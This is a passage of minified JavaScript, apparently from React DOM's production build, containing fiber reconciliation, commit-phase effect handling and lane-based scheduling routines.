t.flags&65536?t:null}return(t.flags&128)!==0?(t.lanes=i,t):(o=o!==null,o!==(e!==null&&e.memoizedState!==null)&&o&&(t.child.flags|=8192,(t.mode&1)!==0&&(e===null||(Ye.current&1)!==0?dt===0&&(dt=3):Xo())),t.updateQueue!==null&&(t.flags|=4),Et(t),null);case 4:return En(),Uo(e,t),e===null&&ma(t.stateNode.containerInfo),Et(t),null;case 10:return ho(t.type._context),Et(t),null;case 17:return $t(t.type)&&mi(),Et(t),null;case 19:if(Ke(Ye),f=t.memoizedState,f===null)return Et(t),null;if(o=(t.flags&128)!==0,g=f.rendering,g===null)if(o)Ea(f,!1);else{if(dt!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(g=Si(e),g!==null){for(t.flags|=128,Ea(f,!1),o=g.updateQueue,o!==null&&(t.updateQueue=o,t.flags|=4),t.subtreeFlags=0,o=i,i=t.child;i!==null;)f=i,e=o,f.flags&=14680066,g=f.alternate,g===null?(f.childLanes=0,f.lanes=e,f.child=null,f.subtreeFlags=0,f.memoizedProps=null,f.memoizedState=null,f.updateQueue=null,f.dependencies=null,f.stateNode=null):(f.childLanes=g.childLanes,f.lanes=g.lanes,f.child=g.child,f.subtreeFlags=0,f.deletions=null,f.memoizedProps=g.memoizedProps,f.memoizedState=g.memoizedState,f.updateQueue=g.updateQueue,f.type=g.type,e=g.dependencies,f.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),i=i.sibling;return qe(Ye,Ye.current&1|2),t.child}e=e.sibling}f.tail!==null&&Te()>Pn&&(t.flags|=128,o=!0,Ea(f,!1),t.lanes=4194304)}else{if(!o)if(e=Si(g),e!==null){if(t.flags|=128,o=!0,i=e.updateQueue,i!==null&&(t.updateQueue=i,t.flags|=4),Ea(f,!0),f.tail===null&&f.tailMode==="hidden"&&!g.alternate&&!Je)return Et(t),null}else 2*Te()-f.renderingStartTime>Pn&&i!==1073741824&&(t.flags|=128,o=!0,Ea(f,!1),t.lanes=4194304);f.isBackwards?(g.sibling=t.child,t.child=g):(i=f.last,i!==null?i.sibling=g:t.child=g,f.last=g)}return f.tail!==null?(t=f.tail,f.rendering=t,f.tail=t.sibling,f.renderingStartTime=Te(),t.sibling=null,i=Ye.current,qe(Ye,o?i&1|2:i&1),t):(Et(t),null);case 22:case 23:return Qo(),o=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==o&&(t.flags|=8192),o&&(t.mode&1)!==0?(Jt&1073741824)!==0&&(Et(t),t.subtreeFlags&6&&(t.flags|=8192)):Et(t),null;case 24:return null;case 25:return null}throw Error(n(156,t.tag))}function pm(e,t){switch(ao(t),t.tag){case 1:return $t(t.type)&&mi(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return En(),Ke(It),Ke(Nt),vo(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 5:return go(t),null;case 13:if(Ke(Ye),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(n(340));kn()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return Ke(Ye),null;case 4:return En(),null;case 10:return ho(t.type._context),null;case 22:case 23:return Qo(),null;case 24:return null;default:return null}}var $i=!1,Ct=!1,mm=typeof WeakSet=="function"?WeakSet:Set,se=null;function Tn(e,t){var i=e.ref;if(i!==null)if(typeof i=="function")try{i(null)}catch(o){tt(e,t,o)}else i.current=null}function Lo(e,t,i){try{i()}catch(o){tt(e,t,o)}}var Xd=!1;function xm(e,t){if(Yl=ti,e=Ru(),Bl(e)){if("selectionStart"in e)var i={start:e.selectionStart,end:e.selectionEnd};else e:{i=(i=e.ownerDocument)&&i.defaultView||window;var o=i.getSelection&&i.getSelection();if(o&&o.rangeCount!==0){i=o.anchorNode;var d=o.anchorOffset,f=o.focusNode;o=o.focusOffset;try{i.nodeType,f.nodeType}catch{i=null;break e}var g=0,b=-1,N=-1,$=0,V=0,K=e,q=null;t:for(;;){for(var re;K!==i||d!==0&&K.nodeType!==3||(b=g+d),K!==f||o!==0&&K.nodeType!==3||(N=g+o),K.nodeType===3&&(g+=K.nodeValue.length),(re=K.firstChild)!==null;)q=K,K=re;for(;;){if(K===e)break t;if(q===i&&++$===d&&(b=g),q===f&&++V===o&&(N=g),(re=K.nextSibling)!==null)break;K=q,q=K.parentNode}K=re}i=b===-1||N===-1?null:{start:b,end:N}}else i=null}i=i||{start:0,end:0}}else i=null;for(Ql={focusedElem:e,selectionRange:i},ti=!1,se=t;se!==null;)if(t=se,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,se=e;else for(;se!==null;){t=se;try{var ie=t.alternate;if((t.flags&1024)!==0)switch(t.tag){case 0:case 11:case 15:break;case 1:if(ie!==null){var le=ie.memoizedProps,nt=ie.memoizedState,P=t.stateNode,C=P.getSnapshotBeforeUpdate(t.elementType===t.type?le:vr(t.type,le),nt);P.__reactInternalSnapshotBeforeUpdate=C}break;case 3:var A=t.stateNode.containerInfo;A.nodeType===1?A.textContent="":A.nodeType===9&&A.documentElement&&A.removeChild(A.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(n(163))}}catch(Y){tt(t,t.return,Y)}if(e=t.sibling,e!==null){e.return=t.return,se=e;break}se=t.return}return ie=Xd,Xd=!1,ie}function Ca(e,t,i){var o=t.updateQueue;if(o=o!==null?o.lastEffect:null,o!==null){var d=o=o.next;do{if((d.tag&e)===e){var f=d.destroy;d.destroy=void 0,f!==void 0&&Lo(t,i,f)}d=d.next}while(d!==o)}}function Di(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var i=t=t.next;do{if((i.tag&e)===e){var o=i.create;i.destroy=o()}i=i.next}while(i!==t)}}function Mo(e){var t=e.ref;if(t!==null){var i=e.stateNode;e.tag,e=i,typeof t=="function"?t(e):t.current=e}}function Zd(e){var t=e.alternate;t!==null&&(e.alternate=null,Zd(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[zr],delete t[ga],delete t[to],delete t[Xp],delete t[Zp])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function eh(e){return e.tag===5||e.tag===3||e.tag===4}function th(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||eh(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Fo(e,t,i){var o=e.tag;if(o===5||o===6)e=e.stateNode,t?i.nodeType===8?i.parentNode.insertBefore(e,t):i.insertBefore(e,t):(i.nodeType===8?(t=i.parentNode,t.insertBefore(e,i)):(t=i,t.appendChild(e)),i=i._reactRootContainer,i!=null||t.onclick!==null||(t.onclick=fi));else if(o!==4&&(e=e.child,e!==null))for(Fo(e,t,i),e=e.sibling;e!==null;)Fo(e,t,i),e=e.sibling}function Bo(e,t,i){var o=e.tag;if(o===5||o===6)e=e.stateNode,t?i.insertBefore(e,t):i.appendChild(e);else if(o!==4&&(e=e.child,e!==null))for(Bo(e,t,i),e=e.sibling;e!==null;)Bo(e,t,i),e=e.sibling}var yt=null,wr=!1;function ks(e,t,i){for(i=i.child;i!==null;)rh(e,t,i),i=i.sibling}function rh(e,t,i){if(Dr&&typeof Dr.onCommitFiberUnmount=="function")try{Dr.onCommitFiberUnmount(Ja,i)}catch{}switch(i.tag){case 5:Ct||Tn(i,t);case 6:var o=yt,d=wr;yt=null,ks(e,t,i),yt=o,wr=d,yt!==null&&(wr?(e=yt,i=i.stateNode,e.nodeType===8?e.parentNode.removeChild(i):e.removeChild(i)):yt.removeChild(i.stateNode));break;case 18:yt!==null&&(wr?(e=yt,i=i.stateNode,e.nodeType===8?eo(e.parentNode,i):e.nodeType===1&&eo(e,i),ia(e)):eo(yt,i.stateNode));break;case 4:o=yt,d=wr,yt=i.stateNode.containerInfo,wr=!0,ks(e,t,i),yt=o,wr=d;break;case 0:case 11:case 14:case 15:if(!Ct&&(o=i.updateQueue,o!==null&&(o=o.lastEffect,o!==null))){d=o=o.next;do{var f=d,g=f.destroy;f=f.tag,g!==void 0&&((f&2)!==0||(f&4)!==0)&&Lo(i,t,g),d=d.next}while(d!==o)}ks(e,t,i);break;case 1:if(!Ct&&(Tn(i,t),o=i.stateNode,typeof o.componentWillUnmount=="function"))try{o.props=i.memoizedProps,o.state=i.memoizedState,o.componentWillUnmount()}catch(b){tt(i,t,b)}ks(e,t,i);break;case 21:ks(e,t,i);break;case 22:i.mode&1?(Ct=(o=Ct)||i.memoizedState!==null,ks(e,t,i),Ct=o):ks(e,t,i);break;default:ks(e,t,i)}}function sh(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var i=e.stateNode;i===null&&(i=e.stateNode=new mm),t.forEach(function(o){var d=Nm.bind(null,e,o);i.has(o)||(i.add(o),o.then(d,d))})}}function br(e,t){var i=t.deletions;if(i!==null)for(var o=0;o<i.length;o++){var d=i[o];try{var f=e,g=t,b=g;e:for(;b!==null;){switch(b.tag){case 5:yt=b.stateNode,wr=!1;break e;case 3:yt=b.stateNode.containerInfo,wr=!0;break e;case 4:yt=b.stateNode.containerInfo,wr=!0;break e}b=b.return}if(yt===null)throw Error(n(160));rh(f,g,d),yt=null,wr=!1;var N=d.alternate;N!==null&&(N.return=null),d.return=null}catch($){tt(d,t,$)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)nh(t,e),t=t.sibling}function nh(e,t){var i=e.alternate,o=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(br(t,e),Mr(e),o&4){try{Ca(3,e,e.return),Di(3,e)}catch(le){tt(e,e.return,le)}try{Ca(5,e,e.return)}catch(le){tt(e,e.return,le)}}break;case 1:br(t,e),Mr(e),o&512&&i!==null&&Tn(i,i.return);break;case 5:if(br(t,e),Mr(e),o&512&&i!==null&&Tn(i,i.return),e.flags&32){var d=e.stateNode;try{Ft(d,"")}catch(le){tt(e,e.return,le)}}if(o&4&&(d=e.stateNode,d!=null)){var f=e.memoizedProps,g=i!==null?i.memoizedProps:f,b=e.type,N=e.updateQueue;if(e.updateQueue=null,N!==null)try{b==="input"&&f.type==="radio"&&f.name!=null&&dr(d,f),pr(b,g);var $=pr(b,f);for(g=0;g<N.length;g+=2){var V=N[g],K=N[g+1];V==="style"?tr(d,K):V==="dangerouslySetInnerHTML"?os(d,K):V==="children"?Ft(d,K):I(d,V,K,$)}switch(b){case"input":it(d,f);break;case"textarea":Tr(d,f);break;case"select":var q=d._wrapperState.wasMultiple;d._wrapperState.wasMultiple=!!f.multiple;var re=f.value;re!=null?_t(d,!!f.multiple,re,!1):q!==!!f.multiple&&(f.defaultValue!=null?_t(d,!!f.multiple,f.defaultValue,!0):_t(d,!!f.multiple,f.multiple?[]:"",!1))}d[ga]=f}catch(le){tt(e,e.return,le)}}break;case 6:if(br(t,e),Mr(e),o&4){if(e.stateNode===null)throw Error(n(162));d=e.stateNode,f=e.memoizedProps;try{d.nodeValue=f}catch(le){tt(e,e.return,le)}}break;case 3:if(br(t,e),Mr(e),o&4&&i!==null&&i.memoizedState.isDehydrated)try{ia(t.containerInfo)}catch(le){tt(e,e.return,le)}break;case 4:br(t,e),Mr(e);break;case 13:br(t,e),Mr(e),d=e.child,d.flags&8192&&(f=d.memoizedState!==null,d.stateNode.isHidden=f,!f||d.alternate!==null&&d.alternate.memoizedState!==null||(Vo=Te())),o&4&&sh(e);break;case 22:if(V=i!==null&&i.memoizedState!==null,e.mode&1?(Ct=($=Ct)||V,br(t,e),Ct=$):br(t,e),Mr(e),o&8192){if($=e.memoizedState!==null,(e.stateNode.isHidden=$)&&!V&&(e.mode&1)!==0)for(se=e,V=e.child;V!==null;){for(K=se=V;se!==null;){switch(q=se,re=q.child,q.tag){case 0:case 11:case 14:case 15:Ca(4,q,q.return);break;case 1:Tn(q,q.return);var ie=q.stateNode;if(typeof ie.componentWillUnmount=="function"){o=q,i=q.return;try{t=o,ie.props=t.memoizedProps,ie.state=t.memoizedState,ie.componentWillUnmount()}catch(le){tt(o,i,le)}}break;case 5:Tn(q,q.return);break;case 22:if(q.memoizedState!==null){lh(K);continue}}re!==null?(re.return=q,se=re):lh(K)}V=V.sibling}e:for(V=null,K=e;;){if(K.tag===5){if(V===null){V=K;try{d=K.stateNode,$?(f=d.style,typeof f.setProperty=="function"?f.setProperty("display","none","important"):f.display="none"):(b=K.stateNode,N=K.memoizedProps.style,g=N!=null&&N.hasOwnProperty("display")?N.display:null,b.style.display=Ar("display",g))}catch(le){tt(e,e.return,le)}}}else if(K.tag===6){if(V===null)try{K.stateNode.nodeValue=$?"":K.memoizedProps}catch(le){tt(e,e.return,le)}}else if((K.tag!==22&&K.tag!==23||K.memoizedState===null||K===e)&&K.child!==null){K.child.return=K,K=K.child;continue}if(K===e)break e;for(;K.sibling===null;){if(K.return===null||K.return===e)break e;V===K&&(V=null),K=K.return}V===K&&(V=null),K.sibling.return=K.return,K=K.sibling}}break;case 19:br(t,e),Mr(e),o&4&&sh(e);break;case 21:break;default:br(t,e),Mr(e)}}function Mr(e){var t=e.flags;if(t&2){try{e:{for(var i=e.return;i!==null;){if(eh(i)){var o=i;break e}i=i.return}throw Error(n(160))}switch(o.tag){case 5:var d=o.stateNode;o.flags&32&&(Ft(d,""),o.flags&=-33);var f=th(e);Bo(e,f,d);break;case 3:case 4:var g=o.stateNode.containerInfo,b=th(e);Fo(e,b,g);break;default:throw Error(n(161))}}catch(N){tt(e,e.return,N)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function gm(e,t,i){se=e,ah(e)}function ah(e,t,i){for(var o=(e.mode&1)!==0;se!==null;){var d=se,f=d.child;if(d.tag===22&&o){var g=d.memoizedState!==null||$i;if(!g){var b=d.alternate,N=b!==null&&b.memoizedState!==null||Ct;b=$i;var $=Ct;if($i=g,(Ct=N)&&!$)for(se=d;se!==null;)g=se,N=g.child,g.tag===22&&g.memoizedState!==null?oh(d):N!==null?(N.return=g,se=N):oh(d);for(;f!==null;)se=f,ah(f),f=f.sibling;se=d,$i=b,Ct=$}ih(e)}else(d.subtreeFlags&8772)!==0&&f!==null?(f.return=d,se=f):ih(e)}}function ih(e){for(;se!==null;){var t=se;if((t.flags&8772)!==0){var i=t.alternate;try{if((t.flags&8772)!==0)switch(t.tag){case 0:case 11:case 15:Ct||Di(5,t);break;case 1:var o=t.stateNode;if(t.flags&4&&!Ct)if(i===null)o.componentDidMount();else{var d=t.elementType===t.type?i.memoizedProps:vr(t.type,i.memoizedProps);o.componentDidUpdate(d,i.memoizedState,o.__reactInternalSnapshotBeforeUpdate)}var f=t.updateQueue;f!==null&&ld(t,f,o);break;case 3:var g=t.updateQueue;if(g!==null){if(i=null,t.child!==null)switch(t.child.tag){case 5:i=t.child.stateNode;break;case 1:i=t.child.stateNode}ld(t,g,i)}break;case 5:var b=t.stateNode;if(i===null&&t.flags&4){i=b;var N=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":N.autoFocus&&i.focus();break;case"img":N.src&&(i.src=N.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var $=t.alternate;if($!==null){var V=$.memoizedState;if(V!==null){var K=V.dehydrated;K!==null&&ia(K)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(n(163))}Ct||t.flags&512&&Mo(t)}catch(q){tt(t,t.return,q)}}if(t===e){se=null;break}if(i=t.sibling,i!==null){i.return=t.return,se=i;break}se=t.return}}function lh(e){for(;se!==null;){var t=se;if(t===e){se=null;break}var i=t.sibling;if(i!==null){i.return=t.return,se=i;break}se=t.return}}function oh(e){for(;se!==null;){var t=se;try{switch(t.tag){case 0:case 11:case 15:var i=t.return;try{Di(4,t)}catch(N){tt(t,i,N)}break;case 1:var o=t.stateNode;if(typeof o.componentDidMount=="function"){var d=t.return;try{o.componentDidMount()}catch(N){tt(t,d,N)}}var f=t.return;try{Mo(t)}catch(N){tt(t,f,N)}break;case 5:var g=t.return;try{Mo(t)}catch(N){tt(t,g,N)}}}catch(N){tt(t,t.return,N)}if(t===e){se=null;break}var b=t.sibling;if(b!==null){b.return=t.return,se=b;break}se=t.return}}var ym=Math.ceil,zi=H.ReactCurrentDispatcher,Wo=H.ReactCurrentOwner,lr=H.ReactCurrentBatchConfig,Ie=0,xt=null,lt=null,vt=0,Jt=0,Rn=ys(0),dt=0,Ta=null,Gs=0,Ui=0,qo=0,Ra=null,zt=null,Vo=0,Pn=1/0,Zr=null,Li=!1,Ho=null,_s=null,Mi=!1,Ns=null,Fi=0,Pa=0,Ko=null,Bi=-1,Wi=0;function Pt(){return(Ie&6)!==0?Te():Bi!==-1?Bi:Bi=Te()}function Ss(e){return(e.mode&1)===0?1:(Ie&2)!==0&&vt!==0?vt&-vt:tm.transition!==null?(Wi===0&&(Wi=tu()),Wi):(e=Me,e!==0||(e=window.event,e=e===void 0?16:uu(e.type)),e)}function jr(e,t,i,o){if(50<Pa)throw Pa=0,Ko=null,Error(n(185));ta(e,i,o),((Ie&2)===0||e!==xt)&&(e===xt&&((Ie&2)===0&&(Ui|=i),dt===4&&Es(e,vt)),Ut(e,o),i===1&&Ie===0&&(t.mode&1)===0&&(Pn=Te()+500,gi&&ws()))}function Ut(e,t){var i=e.callbackNode;tp(e,t);var o=Xa(e,e===xt?vt:0);if(o===0)i!==null&&G(i),e.callbackNode=null,e.callbackPriority=0;else if(t=o&-o,e.callbackPriority!==t){if(i!=null&&G(i),t===1)e.tag===0?em(uh.bind(null,e)):Ju(uh.bind(null,e)),Yp(function(){(Ie&6)===0&&ws()}),i=null;else{switch(ru(o)){case 1:i=Vr;break;case 4:i=Ge;break;case 16:i=Be;break;case 536870912:i=We;break;default:i=Be}i=yh(i,ch.bind(null,e))}e.callbackPriority=t,e.callbackNode=i}}function ch(e,t){if(Bi=-1,Wi=0,(Ie&6)!==0)throw Error(n(327));var i=e.callbackNode;if(An()&&e.callbackNode!==i)return null;var o=Xa(e,e===xt?vt:0);if(o===0)return null;if((o&30)!==0||(o&e.expiredLanes)!==0||t)t=qi(e,o);else{t=o;var d=Ie;Ie|=2;var f=hh();(xt!==e||vt!==t)&&(Zr=null,Pn=Te()+500,Ys(e,t));do try{bm();break}catch(b){dh(e,b)}while(!0);uo(),zi.current=f,Ie=d,lt!==null?t=0:(xt=null,vt=0,t=dt)}if(t!==0){if(t===2&&(d=Sl(e),d!==0&&(o=d,t=Go(e,d))),t===1)throw i=Ta,Ys(e,0),Es(e,o),Ut(e,Te()),i;if(t===6)Es(e,o);else{if(d=e.current.alternate,(o&30)===0&&!vm(d)&&(t=qi(e,o),t===2&&(f=Sl(e),f!==0&&(o=f,t=Go(e,f))),t===1))throw i=Ta,Ys(e,0),Es(e,o),Ut(e,Te()),i;switch(e.finishedWork=d,e.finishedLanes=o,t){case 0:case 1:throw Error(n(345));case 2:Qs(e,zt,Zr);break;case 3:if(Es(e,o),(o&130023424)===o&&(t=Vo+500-Te(),10<t)){if(Xa(e,0)!==0)break;if(d=e.suspendedLanes,(d&o)!==o){Pt(),e.pingedLanes|=e.suspendedLanes&d;break}e.timeoutHandle=Zl(Qs.bind(null,e,zt,Zr),t);break}Qs(e,zt,Zr);break;case 4:if(Es(e,o),(o&4194240)===o)break;for(t=e.eventTimes,d=-1;0<o;){var g=31-xr(o);f=1<<g,g=t[g],g>d&&(d=g),o&=~f}if(o=d,o=Te()-o,o=(120>o?120:480>o?480:1080>o?1080:1920>o?1920:3e3>o?3e3:4320>o?4320:1960*ym(o/1960))-o,10<o){e.timeoutHandle=Zl(Qs.bind(null,e,zt,Zr),o);break}Qs(e,zt,Zr);break;case 5:Qs(e,zt,Zr);break;default:throw Error(n(329))}}}return Ut(e,Te()),e.callbackNode===i?ch.bind(null,e):null}function Go(e,t){var i=Ra;return e.current.memoizedState.isDehydrated&&(Ys(e,t).flags|=256),e=qi(e,t),e!==2&&(t=zt,zt=i,t!==null&&Jo(t)),e}function Jo(e){zt===null?zt=e:zt.push.apply(zt,e)}function vm(e){for(var t=e;;){if(t.flags&16384){var i=t.updateQueue;if(i!==null&&(i=i.stores,i!==null))for(var o=0;o<i.length;o++){var d=i[o],f=d.getSnapshot;d=d.value;try{if(!gr(f(),d))return!1}catch{return!1}}}if(i=t.child,t.subtreeFlags&16384&&i!==null)i.return=t,t=i;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function Es(e,t){for(t&=~qo,t&=~Ui,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var i=31-xr(t),o=1<<i;e[i]=-1,t&=~o}}function uh(e){if((Ie&6)!==0)throw Error(n(327));An();var t=Xa(e,0);if((t&1)===0)return Ut(e,Te()),null;var i=qi(e,t);if(e.tag!==0&&i===2){var o=Sl(e);o!==0&&(t=o,i=Go(e,o))}if(i===1)throw i=Ta,Ys(e,0),Es(e,t),Ut(e,Te()),i;if(i===6)throw Error(n(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,Qs(e,zt,Zr),Ut(e,Te()),null}function Yo(e,t){var i=Ie;Ie|=1;try{return e(t)}finally{Ie=i,Ie===0&&(Pn=Te()+500,gi&&ws())}}function Js(e){Ns!==null&&Ns.tag===0&&(Ie&6)===0&&An();var t=Ie;Ie|=1;var i=lr.transition,o=Me;try{if(lr.transition=null,Me=1,e)return e()}finally{Me=o,lr.transition=i,Ie=t,(Ie&6)===0&&ws()}}function Qo(){Jt=Rn.current,Ke(Rn)}function Ys(e,t){e.finishedWork=null,e.finishedLanes=0;var i=e.timeoutHandle;if(i!==-1&&(e.timeoutHandle=-1,Jp(i)),lt!==null)for(i=lt.return;i!==null;){var o=i;switch(ao(o),o.tag){case 1:o=o.type.childContextTypes,o!=null&&mi();break;case 3:En(),Ke(It),Ke(Nt),vo();break;case 5:go(o);break;case 4:En();break;case 13:Ke(Ye);break;case 19:Ke(Ye);break;case 10:ho(o.type._context);break;case 22:case 23:Qo()}i=i.return}if(xt=e,lt=e=Cs(e.current,null),vt=Jt=t,dt=0,Ta=null,qo=Ui=Gs=0,zt=Ra=null,Vs!==null){for(t=0;t<Vs.length;t++)if(i=Vs[t],o=i.interleaved,o!==null){i.interleaved=null;var d=o.next,f=i.pending;if(f!==null){var g=f.next;f.next=d,o.next=g}i.pending=o}Vs=null}return e}function dh(e,t){do{var i=lt;try{if(uo(),Ei.current=Pi,Ci){for(var o=Qe.memoizedState;o!==null;){var d=o.queue;d!==null&&(d.pending=null),o=o.next}Ci=!1}if(Ks=0,mt=ut=Qe=null,ka=!1,_a=0,Wo.current=null,i===null||i.return===null){dt=1,Ta=t,lt=null;break}e:{var f=e,g=i.return,b=i,N=t;if(t=vt,b.flags|=32768,N!==null&&typeof N=="object"&&typeof N.then=="function"){var $=N,V=b,K=V.tag;if((V.mode&1)===0&&(K===0||K===11||K===15)){var q=V.alternate;q?(V.updateQueue=q.updateQueue,V.memoizedState=q.memoizedState,V.lanes=q.lanes):(V.updateQueue=null,V.memoizedState=null)}var re=Dd(g);if(re!==null){re.flags&=-257,zd(re,g,b,f,t),re.mode&1&&$d(f,$,t),t=re,N=$;var ie=t.updateQueue;if(ie===null){var le=new Set;le.add(N),t.updateQueue=le}else ie.add(N);break e}else{if((t&1)===0){$d(f,$,t),Xo();break e}N=Error(n(426))}}else if(Je&&b.mode&1){var nt=Dd(g);if(nt!==null){(nt.flags&65536)===0&&(nt.flags|=256),zd(nt,g,b,f,t),oo(Cn(N,b));break e}}f=N=Cn(N,b),dt!==4&&(dt=2),Ra===null?Ra=[f]:Ra.push(f),f=g;do{switch(f.tag){case 3:f.flags|=65536,t&=-t,f.lanes|=t;var P=Od(f,N,t);id(f,P);break e;case 1:b=N;var C=f.type,A=f.stateNode;if((f.flags&128)===0&&(typeof C.getDerivedStateFromError=="function"||A!==null&&typeof A.componentDidCatch=="function"&&(_s===null||!_s.has(A)))){f.flags|=65536,t&=-t,f.lanes|=t;var Y=Id(f,b,t);id(f,Y);break e}}f=f.return}while(f!==null)}ph(i)}catch(oe){t=oe,lt===i&&i!==null&&(lt=i=i.return);continue}break}while(!0)}function hh(){var e=zi.current;return zi.current=Pi,e===null?Pi:e}function Xo(){(dt===0||dt===3||dt===2)&&(dt=4),xt===null||(Gs&268435455)===0&&(Ui&268435455)===0||Es(xt,vt)}function qi(e,t){var i=Ie;Ie|=2;var o=hh();(xt!==e||vt!==t)&&(Zr=null,Ys(e,t));do try{wm();break}catch(d){dh(e,d)}while(!0);if(uo(),Ie=i,zi.current=o,lt!==null)throw Error(n(261));return xt=null,vt=0,dt}function wm(){for(;lt!==null;)fh(lt)}function bm(){for(;lt!==null&&!Tt();)fh(lt)}function fh(e){var t=gh(e.alternate,e,Jt);e.memoizedProps=e.pendingProps,t===null?ph(e):lt=t,Wo.current=null}function ph(e){var t=e;do{var i=t.alternate;if(e=t.return,(t.flags&32768)===0){if(i=fm(i,t,Jt),i!==null){lt=i;return}}else{if(i=pm(i,t),i!==null){i.flags&=32767,lt=i;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{dt=6,lt=null;return}}if(t=t.sibling,t!==null){lt=t;return}lt=t=e}while(t!==null);dt===0&&(dt=5)}function Qs(e,t,i){var o=Me,d=lr.transition;try{lr.transition=null,Me=1,jm(e,t,i,o)}finally{lr.transition=d,Me=o}return null}function jm(e,t,i,o){do An();while(Ns!==null);if((Ie&6)!==0)throw Error(n(327));i=e.finishedWork;var d=e.finishedLanes;if(i===null)return null;if(e.finishedWork=null,e.finishedLanes=0,i===e.current)throw Error(n(177));e.callbackNode=null,e.callbackPriority=0;var f=i.lanes|i.childLanes;if(rp(e,f),e===xt&&(lt=xt=null,vt=0),(i.subtreeFlags&2064)===0&&(i.flags&2064)===0||Mi||(Mi=!0,yh(Be,function(){return An(),null})),f=(i.flags&15990)!==0,(i.subtreeFlags&15990)!==0||f){f=lr.transition,lr.transition=null;var g=Me;Me=1;var b=Ie;Ie|=4,Wo.current=null,xm(e,i),nh(i,e),Bp(Ql),ti=!!Yl,Ql=Yl=null,e.current=i,gm(i),Le(),Ie=b,Me=g,lr.transition=f}else e.current=i;if(Mi&&(Mi=!1,Ns=e,Fi=d),f=e.pendingLanes,f===0&&(_s=null),Yf(i.stateNode),Ut(e,Te()),t!==null)for(o=e.onRecoverableError,i=0;i<t.length;i++)d=t[i],o(d.value,{componentStack:d.stack,digest:d.digest});if(Li)throw Li=!1,e=Ho,Ho=null,e;return(Fi&1)!==0&&e.tag!==0&&An(),f=e.pendingLanes,(f&1)!==0?e===Ko?Pa++:(Pa=0,Ko=e):Pa=0,ws(),null}function An(){if(Ns!==null){var e=ru(Fi),t=lr.transition,i=Me;try{if(lr.transition=null,Me=16>e?16:e,Ns===null)var o=!1;else{if(e=Ns,Ns=null,Fi=0,(Ie&6)!==0)throw Error(n(331));var d=Ie;for(Ie|=4,se=e.current;se!==null;){var f=se,g=f.child;if((se.flags&16)!==0){var b=f.deletions;if(b!==null){for(var N=0;N<b.length;N++){var $=b[N];for(se=$;se!==null;){var V=se;switch(V.tag){case 0:case 11:case 15:Ca(8,V,f)}var K=V.child;if(K!==null)K.return=V,se=K;else for(;se!==null;){V=se;var q=V.sibling,re=V.return;if(Zd(V),V===$){se=null;break}if(q!==null){q.return=re,se=q;break}se=re}}}var ie=f.alternate;if(ie!==null){var le=ie.child;if(le!==null){ie.child=null;do{var nt=le.sibling;le.sibling=null,le=nt}while(le!==null)}}se=f}}if((f.subtreeFlags&2064)!==0&&g!==null)g.return=f,se=g;else e:for(;se!==null;){if(f=se,(f.flags&2048)!==0)switch(f.tag){case 0:case 11:case 15:Ca(9,f,f.return)}var P=f.sibling;if(P!==null){P.return=f.return,se=P;break e}se=f.return}}var C=e.current;for(se=C;se!==null;){g=se;var A=g.child;if((g.subtreeFlags&2064)!==0&&A!==null)A.return=g,se=A;else e:for(g=C;se!==null;){if(b=se,(b.flags&2048)!==0)try{switch(b.tag){case 0:case 11:case 15:Di(9,b)}}catch(oe){tt(b,b.return,oe)}if(b===g){se=null;break e}var Y=b.sibling;if(Y!==null){Y.return=b.return,se=Y;break e}se=b.return}}if(Ie=d,ws(),Dr&&typeof Dr.onPostCommitFiberRoot=="function")try{Dr.onPostCommitFiberRoot(Ja,e)}catch{}o=!0}return o}finally{Me=i,lr.transition=t}}return!1}function mh(e,t,i){t=Cn(i,t),t=Od(e,t,1),e=js(e,t,1),t=Pt(),e!==null&&(ta(e,1,t),Ut(e,t))}function tt(e,t,i){if(e.tag===3)mh(e,e,i);else for(;t!==null;){if(t.tag===3){mh(t,e,i);break}else if(t.tag===1){var o=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof o.componentDidCatch=="function"&&(_s===null||!_s.has(o))){e=Cn(i,e),e=Id(t,e,1),t=js(t,e,1),e=Pt(),t!==null&&(ta(t,1,e),Ut(t,e));break}}t=t.return}}function km(e,t,i){var o=e.pingCache;o!==null&&o.delete(t),t=Pt(),e.pingedLanes|=e.suspendedLanes&i,xt===e&&(vt&i)===i&&(dt===4||dt===3&&(vt&130023424)===vt&&500>Te()-Vo?Ys(e,0):qo|=i),Ut(e,t)}function xh(e,t){t===0&&((e.mode&1)===0?t=1:(t=Qa,Qa<<=1,(Qa&130023424)===0&&(Qa=4194304)));var i=Pt();e=Yr(e,t),e!==null&&(ta(e,t,i),Ut(e,i))}function _m(e){var 